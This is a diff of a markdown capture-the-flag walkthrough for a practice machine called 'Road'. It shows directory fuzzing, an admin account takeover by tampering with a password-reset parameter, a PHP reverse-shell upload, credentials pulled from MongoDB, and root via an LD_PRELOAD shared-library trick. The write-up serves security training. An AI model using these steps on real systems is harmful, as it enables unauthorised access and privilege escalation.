@@ -1,33 +1,35 @@
 ---
 sticker: emoji//1f6e3-fe0f
 ---
+# ENUMERATION
+---
 
-# ROAD
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502152628.png)
+# RECONNAISSANCE
+---
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502152636.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502152628.png)
+
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502152636.png)
 
 We got some stuff in here, a `Track Order` functionality and a contact form, I tried `XSS` on the contact form but no luck, if we try `test` on the `Track Order`, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502152734.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502152734.png)
 
 We get this URL format:
 
@@ -36,6 +38,7 @@ http://10.10.167.2/v2/admin/track_orders?awb=test&srchorder=
 ```
 
 Seems like there is a `v2` directory which may contain some sort of login page, let's fuzz and check it out:
+
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.167.2/FUZZ" -ic -c -t 200 -e .php,.html,.git
@@ -69,63 +72,73 @@ career.html             [Status: 200, Size: 9289, Words: 1509, Lines: 254, Durat
 v2                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 172ms]
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502152831.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502152831.png)
 
 If we go to `v2`, we can see this, let's register a test account:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502152959.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502152959.png)
 
 Now, we can login with our test credentials:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153027.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153027.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153032.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153032.png)
+
 
 We got a lot of options, If we go to our profile, we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153146.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153146.png)
 
 We got an admin email `admin@sky.thm`, if we check the options, we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153207.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153207.png)
 
 We got a `ResetUser` functionality, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153307.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153307.png)
 
 We can reset passwords, let's proceed to exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 If we submit a test password to our proxy, we can see the following request:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153425.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153425.png)
 
 If we can modify the `uname` parameter, we can maybe perform `account takeover` on the admin user to set a new password:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153527.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153527.png)
 
 It says password changed, let's try logging in the admin account:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153606.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153606.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153616.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153616.png)
 
 There we go, account takeover worked, if we remember the `profile`, we can upload images, we can maybe embed a reverse shell and gain access:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502153910.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502153910.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502154001.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502154001.png)
+
 
 If we click on `Edit Profile`, the request goes through, if we capture the request, we can get to know the destination path:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502154228.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502154228.png)
 
 We need to go to `/v2/profileimages`
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502154317.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502154317.png)
 
 So, let's simply go to:
 
@@ -135,13 +148,14 @@ http://10.10.167.2/v2/profileimages/thm_shell.php
 
 If we have our listener ready, we can receive the connection:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502154354.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502154354.png)
 
 Let's proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
 
 First thing to do is to get a stable shell:
 
@@ -155,17 +169,19 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502154453.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502154453.png)
 
 Let's use linpeas:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502154957.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502154957.png)
 
-There are some suspicious connections on here, if we check what's the port `27017` used for:
+There are some suspicious connections on here, if we check what's the port `27017`
+used for:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502155127.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502155127.png)
 
 As seen, this port may be used by `mongodb`, let's go inside of it:
+
 
 ```
 www-data@sky:/tmp$ mongo 127.0.0.1
@@ -227,7 +243,7 @@ webdeveloper:BahamasChapp123!@#
 
 We can go into ssh with those:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502155718.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502155718.png)
 
 We are now able to read `user.txt`:
 
@@ -253,7 +269,8 @@ There's a strange binary on here, the interesting stuff on here is the:
 LD_PRELOAD
 ```
 
-LD\_PRELOAD is an environment variable in Linux that allows users to specify a shared library (.so file) to be loaded _before_ all other system libraries during program execution. This mechanism is typically used for debugging or overriding specific functions in existing libraries. However, in a security context, it can be abused for privilege escalation if an attacker controls the `LD_PRELOAD` variable and can execute a binary with elevated privileges (e.g., via sudo). By crafting a malicious shared library that defines functions with the same names as those used by the target binary (e.g., `system()`, `exec()`, or even constructor functions), an attacker can hijack the program’s execution flow. When the binary runs, it loads the attacker’s library first, executing arbitrary code with the privileges of the target process, in this case, root—due to the `sudo` permissions granted to `/usr/bin/sky_backup_utility`.
+LD_PRELOAD is an environment variable in Linux that allows users to specify a shared library (.so file) to be loaded _before_ all other system libraries during program execution. This mechanism is typically used for debugging or overriding specific functions in existing libraries. However, in a security context, it can be abused for privilege escalation if an attacker controls the `LD_PRELOAD` variable and can execute a binary with elevated privileges (e.g., via sudo). By crafting a malicious shared library that defines functions with the same names as those used by the target binary (e.g., `system()`, `exec()`, or even constructor functions), an attacker can hijack the program’s execution flow. When the binary runs, it loads the attacker’s library first, executing arbitrary code with the privileges of the target process, in this case, root—due to the `sudo` permissions granted to `/usr/bin/sky_backup_utility`.
+
 
 Knowing all this, we can get a root shell by doing this:
 
@@ -295,7 +312,7 @@ void _init() {
 gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
 ```
 
-3. Executing the Binary with LD\_PRELOAD
+3. Executing the Binary with LD_PRELOAD
 
 ```
 sudo LD_PRELOAD=./exploit.so /usr/bin/sky_backup_utility
@@ -303,7 +320,7 @@ sudo LD_PRELOAD=./exploit.so /usr/bin/sky_backup_utility
 
 Once we use it, we get a root shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502161151.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502161151.png)
 
 Let's get root flag and finish the CTF:
 
@@ -312,4 +329,5 @@ root@sky:/tmp# cat /root/root.txt
 3a62d897c40a815ecbe267df2f533ac6
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250502161303.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250502161303.png)
+
